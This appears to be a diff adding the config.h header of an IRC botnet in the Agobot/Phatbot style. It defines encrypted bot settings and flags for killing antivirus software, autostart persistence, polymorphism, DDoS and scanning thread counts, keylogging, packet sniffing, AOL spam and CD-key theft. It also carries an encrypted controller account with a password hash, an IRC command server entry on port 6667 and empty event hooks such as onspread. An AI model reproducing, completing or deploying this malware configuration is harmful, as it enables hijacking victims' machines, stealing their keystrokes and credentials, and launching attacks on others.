@@ -1,0 +1,88 @@
+#ifndef __CONFIG_H__
+#define __CONFIG_H__
+
+#include "confbase.h"
+
+// The section name for polymorph
+#define SECTION_NAME ".npxcxqt"
+
+// Array of CVars
+conf_cvar g_aCVars[] = {
+	{	"bot_filename",	"\x03\x54\x05\x86\xE6\x78\x72\x79\x44\x13",	"lMMtb39t1dwpjBhd",	"\x6B\xF3\xB2\x33\x49\xF3\x2A\x38\x3C\x62\x14\x80\xA5\xE9\xDE\x09"	},
+	{	"bot_id",	"\xB4\x1D\x4A",	"fWx2ZHt2WQKj45VQ",	"\x66\x48\xFB\xA1\x55\xCD\x47\x5E\x11\x64\x68\x59\x2F\x8B\x2B\xC7"	},
+	{	"bot_prefix",	".",	NULL,	""	},
+	{	"bot_timeout",	"73000",	NULL,	""	},
+	{	"bot_seclogin",	"true",	NULL,	""	},
+	{	"bot_compnick",	"false",	NULL,	""	},
+	{	"bot_randnick",	"false",	NULL,	""	},
+	{	"bot_meltserver",	"false",	NULL,	""	},
+	{	"bot_topiccmd",	"true",	NULL,	""	},
+	{	"do_speedtest",	"true",	NULL,	""	},
+	{	"do_avkill",	"true",	NULL,	""	},
+	{	"do_stealth",	"false",	NULL,	""	},
+	{	"as_valname",	"\x9B\x67\x30\x57\xFB\xA5\x66\x57\x68\x38\xA9\xB2\xD2\xE2\x21\xFF\xE8",	"iRu6E5bV2VW0P4Qg",	"\x83\x9B\xF3\x04\x04\xCC\x42\x61\xF4\xA3\x46\xC9\x8F\xAA\xD4\xF2"	},
+	{	"as_enabled",	"true",	NULL,	""	},
+	{	"as_service",	"false",	NULL,	""	},
+	{	"as_service_name",	"",	"Gq4uiS0sQMw59UtB",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
+	{	"scan_maxthreads",	"200",	NULL,	""	},
+	{	"scan_maxsockets",	"200",	NULL,	""	},
+	{	"ddos_maxthreads",	"500",	NULL,	""	},
+	{	"redir_maxthreads",	"100",	NULL,	""	},
+	{	"identd_enabled",	"false",	NULL,	""	},
+	{	"cdkey_windows",	"false",	NULL,	""	},
+	{	"scaninfo_level",	"1",	NULL,	""	},
+	{	"spam_aol_channel",	"",	"aopWWn4t030pLWI6",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
+	{	"spam_aol_enabled",	"false",	NULL,	""	},
+	{	"sniffer_enabled",	"false",	NULL,	""	},
+	{	"sniffer_channel",	"\x65\x96\x36\xFD\x53\x35\x28",	"RHc8b603GIQGO8Y1",	"\xEC\xCD\x1C\x94\x52\x80\xB0\x27\xA2\x15\x72\x94\x6D\xF1\xF0\xE6"	},
+	{	"keylog_enabled",	"false",	NULL,	""	},
+	{	"keylog_channel",	"\x76\xB5\x1E\x0B\xF2\x2C\xF5",	"8r2BXUbK8G8f70IG",	"\xCA\x64\x7F\x8F\xDD\x7C\x60\x1D\x6C\xE6\x0C\xF4\x7C\x1F\xFC\x59"	},
+	{	"scaninfo_chan",	"\xB1\xEF\x5B\xDD\xDE\x85\x7F",	"zO4LgUWhI0kQit61",	"\x98\xC7\x66\x5A\x46\x4F\xE7\xFC\xB5\xFD\x04\x2F\x22\xF8\xAD\x31"	},
+	{	"inst_polymorph",	"false",	NULL,	""	},
+	{	"vuln_channel",	"",	"lxm4rjf0TRdfd1eO",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
+};
+
+// Array of Users
+conf_user g_aUsers[] = {
+{	{	"user0.username",	"\xD3\xC9\x6C\x18\xBB\x94",	"G6lDnlBdBAig0U6T",	"\x13\xC7\xFF\x60\x9A\xDE\x89\x09\x7A\xFE\xE2\xE7\x21\x2B\x47\x2C"	},
+	{	"user0.password",	"B2ED3086EEE89C1183E23045F5D136C2",	NULL,	"\xAF\xC9\xDF\xD7\xCC\x78\x96\x76\x83\xF7\x40\xA0\x9E\xE2\xBF\xC3"	},
+	{	"user0.hostmask",	"\xD3\xD0\x0B\xF1\x52\x02\x89\x49\xF2\xB2\x48\x35",	"G6lDnlBdBAig0U6T",	"\x0C\x96\x88\x24\x52\xC4\xC1\xA7\x0C\xED\xF1\xD3\x9C\x2A\x16\xC3"	},
+	{	"user0.identdmask",	"\xC2\x5A\x9A\x6D",	"G6lDnlBdBAig0U6T",	"\xF5\x0A\x29\x91\x23\x5F\xAE\x26\xB8\xDE\x73\x8F\x8E\x50\x92\x8E"	}, },
+};
+
+// Array of Servers
+conf_server g_aServers[] = {
+{	{	"server0.chanpass",	"\xC4\x59\xBE\x24",	"f8QYZw75a1k5MXWm",	"\x26\xA8\x20\xCC\x94\x17\x0A\x2C\x17\xD9\x71\xAD\xC8\xBA\x5F\x61"	},
+	{	"server0.mainchan",	"\x86\xE2\x9D\x77\xD1\x27\x86",	"f8QYZw75a1k5MXWm",	"\xF2\x85\x7C\x23\x24\xFD\xEB\xB8\x31\x44\xDB\x23\x45\x47\x0B\x0A"	},
+	{	"server0.nickprefix",	"\xFE\x16\x52",	"f8QYZw75a1k5MXWm",	"\x03\xBF\xA9\xAC\x8F\xD8\xD8\xA2\xB6\x79\x9C\x8A\x87\x5A\x52\x37"	},
+	{	"server0.port",	"6667",	NULL,	""	},
+	{	"server0.server",	"\xA3\x10\x28\xBF\x88\xC3\x4F\xDB\x2C\x43\x66\xC8",	"7LA7DNrjsf224lED",	"\x5B\x4B\x5D\x2A\x6A\x7D\xD3\x93\xD3\xBE\x03\x0A\x74\x38\x0F\x8E"	},
+	{	"server0.servpass",	"",	"7LA7DNrjsf224lED",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
+	{	"server0.usessl",	"false",	NULL,	""	}	},
+};
+
+// Script
+
+char *g_szScript = \
+	"onstart {\n" \
+	"}\n" \
+	"onconnect {\n" \
+	"}\n" \
+	"onjoin {\n" \
+	"}\n" \
+	"onlogin {\n" \
+	"}\n" \
+	"ondisconnect {\n" \
+	"}\n" \
+	"onremove {\n" \
+	"}\n" \
+	"onspread {\n" \
+	"}\n" \
+	"ondebugeractive {\n" \
+	"}\n" \
+	"ontimer 10080m {\n" \
+	"}\n" \
+	"onstartupfin {\n" \
+	"}\n";
+
+#endif // __CONFIG_H__
